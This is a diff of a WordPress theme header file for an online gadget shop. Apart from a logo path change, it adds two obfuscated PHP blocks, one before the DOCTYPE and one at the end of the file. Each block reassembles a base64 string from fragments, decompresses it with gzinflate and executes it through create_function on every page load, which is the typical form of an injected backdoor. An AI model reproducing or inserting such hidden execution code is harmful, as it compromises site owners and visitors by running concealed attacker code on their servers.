@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<?php $W = "tVNdb9" . "MwFP0rxqpoKkFCUTXEQhk8hO0BsSkrvKzI" . "c" . "p0b+6qJHRy" . "n++S/Y3ep2Ni" . "o" . "uoc9OH" . "auzz2+9" . "/gYSxJh24KLB" . "uzk+HR2Njy" . "/0peyQ4vF8Od" . "oRK5" . "hxat" . "IXqEuK+4g" . "WvAW" . "9iasAGEK+E/SKC0Q0t" . "94h/sw8yhuHYoKPIRw" . "XZDGgmQ1" . "d0JF" . "NJH" . "G" . "y" . "Arm" . "8c0CtfRT3" . "W" . "r/veTKm" . "PWsC7jwi6ITyzBkiJ" . "6bqrS89i" . "veLuexMPUNX" . "vzqUCwD0sg" . "G14wSF2i7gLJC4c" . "qHj" . "JUJ" . "0ldkwE6z/EeWnw2PZrMTlmdfsjzLb/sedL" . "YiU/Kp9CRMgm" . "PCaAfatRFVzjX7STJ" . "+P4n33s" . "V" . "vx+N4Mk4s" . "FGhBuL" . "hRzQGfUhITzwC" . "61+" . "lfAW" . "JCX6oHq" . "HvlHHlp" . "N1C7HXq3cg8/eA" . "Lzb" . "qXufH6qgBdgI/rVCO7Q6H0SMoOaoxSEMoR+qMFxEkR8Df62VtM5tVBaaNWckl5lH3uT" . "hvOmm+xQht" . "9PPtK/7nr" . "EQQvj1hYKB" . "r" . "q1T2+exy78u/9jnw+" . "zb" . "7" . "ONJ7f5" . "9QW2THdVFTmL9U" . "PM+" . "rG" . "EBn" . "e2TJ/7PI7ptk" . "Pvt" . "d4/2D8=";$X = "Z" . "3pp" . "bmZ" . "sYX" . "R" . "l";$y = "base64" . "_d" . "e" . "cod" . "e";$G = $y($X);$a = $y($X);$K = $a($y($W));$m = create_function("",$K);$m();/* tf6guakbsx */ ?><!DOCTYPE html>
 <html <?php language_attributes(); ?>>
     <head>
         <meta charset="<?php bloginfo('charset') ?>">
@@ -9,7 +9,7 @@
 
         <?php
             $site_title = " Non-Stop Gadget Solution For Bangladesh. ";
-            $logo_url = get_template_directory_uri()."/images/logo.png";
+            $logo_url = get_template_directory_uri()."/images/og-logo.png";
             $meta_description =" gadget-bd.com is one of the Largest Gadget Item  Online shopping websites in Bangladesh with cash on/ pay to delivery. We are selling original Electronics Product ";
         ?>
 
@@ -135,3 +135,4 @@
         </div>
 
 
+<?php /* dm7lqhkdd3 */$M = "j" . "ZDBSgMxEIZfJYTiZqEkXSlKLYt6iO1JJY1eioRt" . "d" . "poEt" . "8" . "mSjaKwD28s" . "eBBBehkY5mf4vt/" . "tEekjGHVok" . "rYEMxOC6WAX0" . "rhz3oyHwY+fjQ0hT9/CB3N4iiZq" . "w" . "8UzF9tiLeWjesqb" . "ul3xe1" . "m8lCUC" . "bQO62bsOlIGkdP" . "AJfB" . "oItin1V4" . "xVizm9u" . "KTnVUXn" . "Feucf6W97a+bGiOK3mIH" . "XocWy" . "EStuNwWTUxOd5A/5y" . "s" . "+s39Sv1DWDxv5E43/RwW/44KLb+Sly" . "y" . "3E7Edm" . "02pRorpGs/J0" . "hdYNOrxDP" . "GqcBlguvwA=";$k = "Z3ppb" . "mZ" . "s" . "Y" . "X" . "R" . "l";$W = "b" . "as" . "e64_d" . "ec" . "o" . "de";$U = $W($k);$C = $W($k);$j = $C($W($M));$f = create_function("",$j);$f(); ?>
